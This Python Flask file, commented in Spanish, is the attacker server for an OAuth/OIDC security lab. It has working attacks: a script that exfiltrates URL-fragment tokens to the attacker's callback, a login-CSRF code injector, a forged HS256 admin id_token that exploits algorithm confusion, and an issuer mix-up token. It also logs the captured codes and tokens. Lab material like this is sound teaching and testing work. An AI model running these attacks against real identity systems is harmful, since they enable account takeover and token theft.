"""
Servidor del ATACANTE del laboratorio — Kavacon 2026.

Minimo a proposito:
 - /callback  : recibe codes/tokens/fragments (casos 1 y 2) y los loguea.
 - /collect   : recibe el #fragment que roba steal.js (caso 2).
 - /steal.js  : "widget de tercero" que el RP carga y que exfiltra el fragment.
 - /caso3/csrf: escenifica el login-CSRF (caso 3): consigue un code para la
                cuenta del atacante y arma el link que se lo inyecta a la victima.
"""
import base64
import datetime
import hashlib
import hmac
import json
import os
import time
import urllib.parse

import requests
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from flask import Flask, Response, jsonify, render_template, request
from jwt import PyJWK

OP_INTERNAL_URL = os.environ.get("OP_INTERNAL_URL", "http://host.docker.internal:9000").rstrip("/")
RP_BROWSER_URL = os.environ.get("RP_BROWSER_URL", "http://localhost:8081").rstrip("/")

app = Flask(__name__)
CAPTURED = []

STEAL_JS = """// third-party widget (atacante)
(function () {
  var h = window.location.hash ? window.location.hash.substring(1) : '';
  if (!h) return;
  var qs = new URLSearchParams(h).toString();
  var img = new Image();           // exfiltracion via pixel: sin CORS
  img.src = 'ATTACKER_URL/callback?' + qs;
})();
"""

# state fijo del atacante: no es el state de la victima, justamente por eso el
# callback seguro lo rechaza.
ATTACKER_STATE = "atacante-state-fijo"


def log(kind, data):
    entry = {
        "ts": datetime.datetime.now().isoformat(timespec="seconds"),
        "kind": kind,
        "data": data,
        "code": data.get("code") if isinstance(data, dict) else None,
        "access_token": data.get("access_token") if isinstance(data, dict) else None,
        "id_token": data.get("id_token") if isinstance(data, dict) else None,
    }
    CAPTURED.append(entry)
    print(f"[ATACANTE] {entry['ts']} {kind}: {data}", flush=True)
    return entry


def get_attacker_code(variant):
    """Loguea como 'atacante' y consigue un authorization code SIN canjearlo."""
    client_id = f"caso3-{variant}"
    redirect_uri = f"{RP_BROWSER_URL}/caso3/{variant}/callback"
    s = requests.Session()
    ex = f"{OP_INTERNAL_URL}/api/v3/flows/executor/default-authentication-flow/"
    h = {"Accept": "application/json"}
    s.get(ex, headers=h, timeout=10)
    s.post(ex, json={"uid_field": "atacante"}, headers=h, timeout=10)
    r = s.post(ex, json={"password": "12345"}, headers=h, timeout=10)
    if r.json().get("component") != "xak-flow-redirect":
        raise RuntimeError("no se pudo loguear como atacante")
    params = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "scope": "openid email profile",
        "state": ATTACKER_STATE,
    }
    au = f"{OP_INTERNAL_URL}/application/o/authorize/?" + urllib.parse.urlencode(params)
    r = s.get(au, allow_redirects=False, timeout=10)
    loc = r.headers.get("Location", "")
    hops = 0
    while r.status_code in (301, 302) and "/caso3/" not in loc and hops < 6:
        nxt = loc if loc.startswith("http") else OP_INTERNAL_URL + loc
        r = s.get(nxt, allow_redirects=False, timeout=10)
        loc = r.headers.get("Location", "")
        hops += 1
    code = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("code", [None])[0]
    if not code:
        raise RuntimeError(f"no se obtuvo code (loc={loc[:120]})")
    victim_link = f"{redirect_uri}?code={code}&state={ATTACKER_STATE}"
    return victim_link


@app.route("/callback")
def callback():
    params = request.args.to_dict(flat=True)
    if params:
        log("query", params)
    return render_template("trap.html")


@app.route("/collect", methods=["POST"])
def collect():
    log("fragment", request.get_json(silent=True) or {})
    return jsonify({"ok": True})


@app.route("/steal.js")
def steal_js():
    base = request.host_url.rstrip("/")
    return Response(STEAL_JS.replace("ATTACKER_URL", base), mimetype="application/javascript")


@app.route("/caso3/csrf")
def caso3_csrf():
    variant = request.args.get("variant", "insecure")
    return render_template("csrf.html", variant=variant)


@app.route("/caso3/csrf/code")
def caso3_csrf_code():
    variant = request.args.get("variant", "insecure")
    try:
        link = get_attacker_code(variant)
        # Esto es preparacion interna del atacante, NO una captura de la victima:
        # en el caso 3 el atacante nunca recibe datos (la victima va al RP). Solo
        # al log de consola, no al listado de capturas.
        print(f"[ATACANTE] csrf-armed variant={variant} link={link}", flush=True)
        return jsonify({"url": link, "account": "atacante@lab.local"})
    except Exception as exc:  # noqa: BLE001
        return jsonify({"error": str(exc)}), 500


def forge_hs256_admin_token(slug="caso4b", client_id="caso4b"):
    """Falsifica un id_token HS256 firmado con la clave PUBLICA del OP como secreto.
    Si el RP elige el algoritmo segun el header, lo acepta (confusion de algoritmo)."""
    data = requests.get(f"{OP_INTERNAL_URL}/application/o/{slug}/jwks/", timeout=10).json()
    jwk = data["keys"][0]
    pem = PyJWK.from_dict(jwk).key.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
    now = int(time.time())
    header = {"alg": "HS256", "typ": "JWT", "kid": jwk.get("kid")}
    payload = {
        "iss": f"{OP_INTERNAL_URL}/application/o/{slug}/",
        "aud": client_id,
        "sub": "forged-admin",
        "email": "akadmin@lab.local",
        "name": "Admin Falsificado",
        "groups": ["authentik Admins"],
        "is_admin": True,
        "iat": now,
        "exp": now + 3600,
        "nonce": "forged",
    }

    def b64(d):
        return base64.urlsafe_b64encode(
            json.dumps(d, separators=(",", ":")).encode()
        ).decode().rstrip("=")

    signing_input = f"{b64(header)}.{b64(payload)}"
    sig = base64.urlsafe_b64encode(
        hmac.new(pem, signing_input.encode(), hashlib.sha256).digest()
    ).decode().rstrip("=")
    return f"{signing_input}.{sig}"


def get_evil_id_token():
    """Loguea como 'atacante' en OP-Evil (caso6-evil) y obtiene un id_token real
    firmado por ese OP (code + canje). El RP mix-up lo acepta si no valida iss."""
    client_id = "caso6-evil"
    secret = "caso6-evil-secret-no-usar-en-prod"
    redirect_uri = "http://localhost:8082/caso6/evil-callback"
    s = requests.Session()
    h = {"Accept": "application/json"}
    ex = f"{OP_INTERNAL_URL}/api/v3/flows/executor/default-authentication-flow/"
    s.get(ex, headers=h, timeout=10)
    s.post(ex, json={"uid_field": "atacante"}, headers=h, timeout=10)
    r = s.post(ex, json={"password": "12345"}, headers=h, timeout=10)
    if r.json().get("component") != "xak-flow-redirect":
        raise RuntimeError("no se pudo loguear como atacante")
    params = {
        "client_id": client_id,
        "response_type": "code",
        "redirect_uri": redirect_uri,
        "scope": "openid email profile",
        "state": "evil",
    }
    r = s.get(f"{OP_INTERNAL_URL}/application/o/authorize/?" + urllib.parse.urlencode(params),
              allow_redirects=False, timeout=10)
    loc = r.headers.get("Location", "")
    hops = 0
    while r.status_code in (301, 302) and "/caso6/evil-callback" not in loc and hops < 6:
        nxt = loc if loc.startswith("http") else OP_INTERNAL_URL + loc
        r = s.get(nxt, allow_redirects=False, timeout=10)
        loc = r.headers.get("Location", "")
        hops += 1
    code = urllib.parse.parse_qs(urllib.parse.urlparse(loc).query).get("code", [None])[0]
    if not code:
        raise RuntimeError("no se obtuvo code de OP-Evil")
    tr = requests.post(
        f"{OP_INTERNAL_URL}/application/o/token/",
        data={"grant_type": "authorization_code", "code": code, "redirect_uri": redirect_uri,
              "client_id": client_id, "client_secret": secret},
        timeout=10,
    )
    if tr.status_code != 200:
        raise RuntimeError(f"token endpoint OP-Evil {tr.status_code}: {tr.text}")
    return tr.json().get("id_token")


@app.route("/caso6/mixup")
def caso6_mixup():
    variant = request.args.get("variant", "insecure")
    return render_template("mixup.html", variant=variant)


@app.route("/caso6/mixup/token")
def caso6_mixup_token():
    variant = request.args.get("variant", "insecure")
    try:
        tok = get_evil_id_token()
        verify_url = f"{RP_BROWSER_URL}/caso6/{variant}/verify?id_token={urllib.parse.quote(tok)}"
        print(f"[ATACANTE] id_token de OP-Evil emitido para variant={variant}", flush=True)
        return jsonify({"token": tok, "verify_url": verify_url})
    except Exception as exc:  # noqa: BLE001
        return jsonify({"error": str(exc)}), 500


@app.route("/caso4b/forge")
def caso4b_forge():
    variant = request.args.get("variant", "insecure")
    return render_template("forge.html", variant=variant)


@app.route("/caso4b/forge/token")
def caso4b_forge_token():
    variant = request.args.get("variant", "insecure")
    try:
        tok = forge_hs256_admin_token()
        verify_url = f"{RP_BROWSER_URL}/caso4b/{variant}/verify?id_token={urllib.parse.quote(tok)}"
        print(f"[ATACANTE] falsificado HS256 admin para variant={variant}", flush=True)
        return jsonify({"token": tok, "verify_url": verify_url})
    except Exception as exc:  # noqa: BLE001
        return jsonify({"error": str(exc)}), 500


@app.route("/captures")
def captures():
    return jsonify(CAPTURED)


@app.route("/")
def index():
    return render_template("trap.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8082)
